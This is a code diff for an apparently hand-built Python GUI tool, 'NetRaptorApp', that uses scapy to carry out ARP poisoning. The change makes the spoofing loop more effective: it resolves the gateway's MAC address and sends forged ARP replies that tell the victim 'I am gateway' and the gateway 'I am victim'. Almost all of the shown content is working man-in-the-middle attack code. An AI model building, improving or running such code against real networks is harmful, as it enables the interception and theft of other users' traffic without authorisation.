@@ -177,20 +177,25 @@ class NetRaptorApp:
 
 
     def arp_poison(self, target_ip, target_mac, gateway_ip):
+        
+        gateway_mac = get_mac(gateway_ip)
+        if not gateway_mac:
+           messagebox.showerror("Error", f"Could not resolve MAC for gateway {gateway_ip}")
+           self.running = False
+           return
+
         try:
             while self.running:
-                # Send ARP response to target
-                arp_response = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip)
-                send(arp_response, verbose=0)
-                
-                # Send ARP response to gateway
-                arp_response = ARP(op=2, pdst=gateway_ip, hwdst="ff:ff:ff:ff:ff:ff", psrc=target_ip)
-                send(arp_response, verbose=0)
-                
-                # Send ARP packets every second
-                time.sleep(1)
+                  # Poison victim: tell victim "I am gateway"
+                  send(ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip), verbose=0)
+            
+                  # Poison gateway: tell gateway "I am victim"
+                  send(ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac, psrc=target_ip), verbose=0)
+            
+                  time.sleep(1)
         except Exception as e:
-            messagebox.showerror("Error", str(e))
+               messagebox.showerror("Error", str(e))
+
 
     def restore_network(self, target_ip, target_mac, gateway_ip, gateway_mac):
          # Restore ARP for Target to Gateway
@@ -204,6 +209,7 @@ if __name__ == "__main__":
     root = tk.Tk()
     app = NetRaptorApp(root)
     root.mainloop()
+
 
 
 
